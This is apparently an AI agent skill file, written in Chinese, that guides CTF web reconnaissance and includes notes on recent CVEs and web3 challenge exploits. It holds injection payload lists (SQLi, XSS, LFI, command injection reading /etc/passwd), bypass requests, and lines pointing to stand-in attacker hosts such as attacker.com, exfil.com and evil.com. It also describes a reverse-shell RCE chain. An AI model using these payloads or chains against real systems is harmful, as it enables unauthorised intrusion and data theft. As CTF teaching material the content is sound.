---
name: recon
description: CTF 初始侦察与信息收集。解题第一步，用于发现攻击面、识别技术栈、寻找潜在漏洞点。
allowed-tools: Bash, Read, Write
---

# CTF 初始侦察指南

当你收到一个目标地址但不知道是什么漏洞时，按照本指南进行系统化的初始侦察。

---

## Phase 1: 基础信息收集（必须执行）

### 1.1 HTTP 基础探测

```python
import requests

url = "http://target.com"

# 获取基础响应
resp = requests.get(url, timeout=10)
print(f"Status: {resp.status_code}")
print(f"Server: {resp.headers.get('Server', 'Unknown')}")
print(f"X-Powered-By: {resp.headers.get('X-Powered-By', 'Unknown')}")
print(f"Content-Type: {resp.headers.get('Content-Type', '')}")
print(f"Set-Cookie: {resp.headers.get('Set-Cookie', 'None')}")

# 检查响应内容特征
if "PHP" in resp.text or "php" in resp.text:
    print("[+] 可能是 PHP 应用")
if "Django" in resp.text or "csrfmiddlewaretoken" in resp.text:
    print("[+] 可能是 Django 应用")
if "Flask" in resp.text or "Werkzeug" in resp.text:
    print("[+] 可能是 Flask 应用")
if "Express" in resp.text or "Node.js" in resp.text:
    print("[+] 可能是 Node.js/Express 应用")
if "ASP.NET" in resp.text or "__VIEWSTATE" in resp.text:
    print("[+] 可能是 ASP.NET 应用")
```

### 1.2 检查关键文件

```bash
# robots.txt
curl -s http://target.com/robots.txt

# sitemap.xml
curl -s http://target.com/sitemap.xml

# 常见敏感文件
curl -s http://target.com/.git/config
curl -s http://target.com/.env
curl -s http://target.com/backup.zip
curl -s http://target.com/config.php.bak
curl -s http://target.com/web.config
curl -s http://target.com/package.json
```

---

## Phase 2: 技术栈识别

### 2.1 Cookie 分析

| Cookie 名称 | 技术栈 |
|------------|--------|
| PHPSESSID | PHP |
| JSESSIONID | Java (Tomcat/Jetty) |
| sessionid | Django |
| connect.sid | Express/Node.js |
| ASP.NET_SessionId | ASP.NET |
| laravel_session | Laravel |

### 2.2 错误页面特征

```python
# 故意触发错误，观察特征
import requests

# 404 测试
resp_404 = requests.get("http://target.com/this_page_not_exists")
print(f"404 页面特征: {resp_404.text[:500]}")

# 500 测试（尝试异常输入）
resp_500 = requests.get("http://target.com/?test=<script>alert(1)</script>")
if resp_500.status_code == 500:
    print("[+] 可能对特殊字符敏感")
```

---

## Phase 3: 目录与端点发现

### 3.1 常见路径扫描

```bash
# 使用 dirsearch（快速）
dirsearch -u http://target.com -e php,html,js,txt -q

# 或使用 gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -q

# 常见管理后台路径
/admin
/admin.php
/login
/login.php
/wp-admin
/manager
/console
/dashboard
/api
/api/v1
/swagger
```

### 3.2 API 端点探测

```python
import requests

base = "http://target.com"

# 常见 API 路径
api_paths = [
    "/api", "/api/v1", "/api/v2",
    "/graphql", "/graphiql",
    "/swagger", "/swagger-ui", "/api-docs",
    "/rest", "/rest/v1"
]

for path in api_paths:
    resp = requests.get(base + path)
    if resp.status_code == 200:
        print(f"[+] 发现 API: {path}")
        print(f"    内容: {resp.text[:200]}")
```

---

## Phase 4: 参数发现

### 4.1 URL 参数分析

观察目标 URL 是否包含参数：
- `?id=1` → 可能是 SQL 注入点
- `?page=about` → 可能是文件包含
- `?url=http://...` → 可能是 SSRF
- `?cmd=ls` → 可能是命令注入

### 4.2 表单发现

```python
from bs4 import BeautifulSoup
import requests

resp = requests.get("http://target.com")
soup = BeautifulSoup(resp.text, 'html.parser')

forms = soup.find_all('form')
for i, form in enumerate(forms):
    print(f"\n[Form {i+1}]")
    print(f"Action: {form.get('action', 'self')}")
    print(f"Method: {form.get('method', 'GET')}")

    inputs = form.find_all('input')
    for inp in inputs:
        name = inp.get('name', 'unnamed')
        type_ = inp.get('type', 'text')
        print(f"  - {name} ({type_})")
```

---

## Phase 5: 漏洞线索识别

### 5.1 输入点识别

以下特征提示可能存在漏洞：

| 特征 | 可能的漏洞 |
|------|-----------|
| 搜索框 | SQL 注入、XSS、命令注入 |
| 文件上传 | 文件上传漏洞、RCE |
| URL 参数 | SQL 注入、LFI/RFI、SSRF、IDOR |
| Cookie | 认证绕过、反序列化 |
| Header 回显 | HTTP 头注入、XSS |
| 模板渲染 | SSTI |

### 5.2 错误信息分析

```python
# 测试各种注入
import requests

test_payloads = {
    "sql": ["'", "\"", "1' OR '1'='1", "1 AND 1=2"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    "lfi": ["../../../etc/passwd", "....//....//etc/passwd"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
    "cmd": ["; ls", "| whoami", "&& cat /etc/passwd"]
}

for vuln_type, payloads in test_payloads.items():
    print(f"\n测试 {vuln_type}:")
    for payload in payloads:
        # 根据实际情况构造请求
        resp = requests.get(f"http://target.com/?test={payload}")
        if "error" in resp.text.lower() or resp.status_code == 500:
            print(f"  [!] {payload} 触发异常，可能存在 {vuln_type}")
```

---

## Phase 6: 侦察结果分析

完成侦察后，整理以下信息：

```markdown
## 侦察报告模板

### 基础信息
- **目标**: http://target.com
- **技术栈**: PHP/Apache (根据 Server 头和 Cookie)
- **框架**: Laravel (根据 laravel_session cookie)

### 发现的端点
- /login - 登录页面
- /admin - 管理后台
- /api/v1/users - API 接口

### 输入点
- GET 参数: id, page, search
- POST 表单: 登录表单 (username, password)
- Cookie: session_id

### 潜在漏洞线索
1. **SQL 注入**: id 参数可能是数字型注入点
2. **认证绕过**: 登录页面可能存在逻辑漏洞
3. **IDOR**: /api/v1/users?id=1 可能可以遍历

### 下一步建议
加载对应漏洞类型的 Skill 进行深入测试
```

---

## 快速决策流程

```
发现登录页面 → 尝试: SQL注入、认证绕过、暴力破解
发现搜索功能 → 尝试: SQL注入、XSS、命令注入
发现文件上传 → 尝试: 文件上传漏洞、RCE
发现 URL 参数 → 尝试: SQL注入、LFI/RFI、SSRF
发现模板渲染 → 尝试: SSTI
发现 API 接口 → 尝试: IDOR、认证绕过、注入
```

---

## 最佳实践

1. **先侦察，后攻击**：不要一上来就盲注，先了解目标
2. **记录所有发现**：IP、端口、技术栈、端点、参数
3. **从简单到复杂**：先测试明显的注入点
4. **注意 WAF**：如果请求被拦截，尝试绕过
5. **保存证据**：截图、保存响应，便于分析

---

## 来自外部导入内容 (CTF Web - cves.md)

### CVE-2025-29927: Next.js Middleware 绕过

**受影响:** Next.js < 14.2.25, 15.x < 15.2.3

```http
GET /protected/endpoint HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

**与 SSRF 链接 (Note Keeper, Pragyan 2026):**
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     -H "Location: http://backend:4000/flag" \
     https://target/api/login
```

### CVE-2025-0167: Curl .netrc 凭证泄露

服务器 A (在 `.netrc` 中) 重定向到服务器 B → curl 如果 B 以 `401 + WWW-Authenticate: Basic` 响应则发送凭证到 B。

### Uvicorn CRLF 注入 (未修补 N-Day)

**受影响:** Uvicorn (FastAPI 默认 ASGI 服务器)

Uvicorn 不过滤响应头中的 CRLF。启用:
1. **CSP 绕过** — 注入破坏 Content-Security-Policy 的头
2. **缓存污染** — 破坏头/体边界，Nginx 缓存攻击者内容
3. **XSS** — `\r\n\r\n` 终止头，剩余成为响应体

### Python urllib 方案验证绕过 (0-Day)

**受影响:** Python `urllib` — `urlsplit` vs `urlretrieve` 不一致。

```python
# 应用通过 urlsplit 阻止 http/https:
parsed = urlsplit(user_url)
if parsed.scheme in ['http', 'https']: raise Exception("Blocked")
# 绕过: <URL:http://attacker.com/malicious.so>
```

### Chrome Referrer 泄露通过 Link 头 (2025)

```http
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

### TCP 包分割 (防火墙绕过)

```python
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")
```

### Puppeteer/Chrome JavaScript 绕过

`page.setJavaScriptEnabled(false)` 仅影响当前上下文。`window.open()` 从 iframe → 新窗口启用 JS。

### Python python-dotenv 注入

逃逸序列和新行:
```text
backup_server=x\'\nEVIL_VAR=malicious_value\n\'
```

### HTTP 请求分割通过 RFC 2047

CherryPy 解码 RFC 2047 头 → CRLF 注入。

### Waitress WSGI Cookie 外泄

无效 HTTP 方法在错误响应中回显。CRLF 分割请求，cookie 值到达方法位置，错误回显它。

### Deno Import Map 劫持

通过原型链污染:
```javascript
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```

### CVE-2025-8110: Gogs Symlink RCE

1. 创建仓库，`ln -s .git/config malicious_link`，推送
2. API 更新 `malicious_link` → 覆盖 `.git/config`
3. 注入 `core.sshCommand` 和反向 shell

### CVE-2021-22204: ExifTool DjVu Perl 注入

**受影响:** ExifTool ≤ 12.23。DjVu ANTa 注解块使用 Perl `eval` 解析。

### 损坏的认证通过 Truthy 哈希检查 (0xFun 2026)

`sha256().hexdigest()` 返回非空字符串 (Python 中 truthy)。认证函数检查 `if sha256(...)` 而总是 True — 实际哈希比较缺失。

### AAEncode/JJEncode JS 解混淆 (0xFun 2026)

覆盖 `Function.prototype.constructor` 来拦截:
```javascript
Function.prototype.constructor = function(code) {
    console.log("Decoded:", code);
    return function() {};
};
```

### 协议复用 — SSH+HTTP 同端口 (0xFun 2026)

服务器通过首字节区分 SSH 和 HTTP。

### CVE-2024-28184: WeasyPrint 附件 SSRF / 文件读取

**受影响:** WeasyPrint (多个版本)

**攻击向量:**
1. **SSRF:** `<a rel="attachment" href="http://127.0.0.1/admin/flag">`
2. **本地文件读取:** `<link rel="attachment" href="file:///flag.txt">`

### CVE-2025-55182 / CVE-2025-66478: React Server Components Flight Protocol RCE

**受影响:** React Server Components / Next.js (Flight 协议反序列化)

通过构造函数链 (`constructor → constructor → Function`) 制作假的 Flight chunk 利用。

### CVE-2024-45409: Ruby-SAML XPath Digest Smuggling (Barrier HTB)

**受影响:** GitLab 17.3.2 (ruby-saml 库)

利用 XPath 在 ruby-saml 签名验证中的歧义。

### CVE-2023-27350: PaperCut NG 认证绕过 + RCE (Bamboo HTB)

**受影响:** PaperCut NG < 22.0.9

**攻击链:**
1. 访问 `/app?service=page/SetupCompleted` 获取未认证管理员会话
2. 启用 `print-and-device.script.enabled`
3. 在打印机设置中注入 RhinoJS 脚本获取 RCE

### CVE-2012-0053: Apache HttpOnly Cookie 泄露通过 400 错误请求 (RC3 CTF 2016)

Apache 2.2.x 在 400 错误页面中反映 cookies，绕过 HttpOnly 标志保护。

---

## 来自外部导入内容 (CTF Web - web3.md)

### 挑战基础设施模式

1. **认证**: GET `/api/auth/nonce` → 用 `personal_sign` 签名 → POST `/api/auth/login`
2. **实例创建**: 调用工厂的 `factory.createInstance()` (需要测试网 ETH)
3. **利用**: 与部署的实例合约交互
4. **检查**: GET `/api/challenges/check-solution` → 如果 `isSolved()` 为真则返回 flag

```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower()
})
s.cookies.set('token', r.json()['token'])
```

### EIP-1967 Proxy Pattern 利用

**存储槽:**
```text
Implementation: keccak256("eip1967.proxy.implementation") - 1
Admin:          keccak256("eip1967.proxy.admin") - 1
```

```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc  # impl
```

### ABI Coder v1 vs v2 - 脏地址绕过

Solidity 0.8.x 默认为 ABI coder v2，验证 `address` 参数的高 12 字节为零。使用 `pragma abicoder v1` 无验证。

### Delegatecall 存储上下文滥用 (EHAX 2026)

**模式 (Heist v1):** Vault 合约有 `delegatecall` 到治理合约。`setGovernance()` **无访问控制**。

**攻击链:**
1. 部署匹配 vault 存储布局的攻击者合约
2. `setGovernance(attacker_address)` — 无访问控制
3. `execute(abi.encodeWithSignature("attack(address)", player))` — delegatecall
4. 攻击者的 `attack()` 写入 `paused=false` 到 slot 0, `admin=player` 到 slot 1
5. `withdraw()` — 现在作为 admin 授权，vault 未暂停

### Groth16 证明伪造用于区块链治理 (DiceCTF 2026)

**模式 (Housing Crisis):** DAO 治理受 Groth16 ZK 证明保护。两个 ZK 特定漏洞:

**损坏的信任设置 (delta == gamma):** 轻易伪造任何证明:
```python
forged_A = vk_alpha1
forged_B = vk_beta2
forged_C = neg(vk_x)
```

**证明重放 (无约束 nullifier):** DAO 从不跟踪使用的 `proposalNullifierHash` 值。

### Phantom Market 不可解析 + 强制资助 (DiceCTF 2026)

**漏洞 1 — Phantom market 投注:** `bet()` 检查 `marketResolution[market] == 0` 但**不**检查市场是否正式存在。

**漏洞 2 — 不可解析时状态持久化:** 当 `createMarket()` 稍后到达 phantom market ID 时，它写入 `marketResolution[id] = 0`。这有效地"不可解析"了市场，但旧的 `totalYesBet`/`totalNoBet` 值保持不变。

**漏洞 3 — 通过 selfdestruct 强制资助:**
```solidity
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

### Solidity 瞬态存储清理辅助碰撞 (Solidity 0.8.28-0.8.33)

**受影响:** Solidity 0.8.28 到 0.8.33，IR pipeline only (`--via-ir` flag)。在 0.8.34 修复。

**根本原因:** IR pipeline 生成 Yul 辅助函数用于 `delete` 操作。辅助名称来自值类型但**忽略存储位置** (持久 vs 瞬态)。当合约同时删除持久和瞬态变量时，两者生成同名辅助函数。

### Web3 CTF 提示

- **Factory 模式:** Instance = 每玩家合约。检查 `playerToInstance(address)` 映射。
- **Proxy fallback:** 所有未识别调用通过 delegatecall 到实现。
- **升级函数:** 检查它们是否有访问控制！许多挑战保持开放。
- **storage layout:** 映射使用 `keccak256(abi.encode(key, slot))` 进行存储位置。
- **空 revert 数据 (`0x`):** 通常是 ABI 解码器验证失败。
- **Foundry 工具:** `cast call` (读), `cast send` (写), `cast storage` (原始槽), `forge create` (部署)
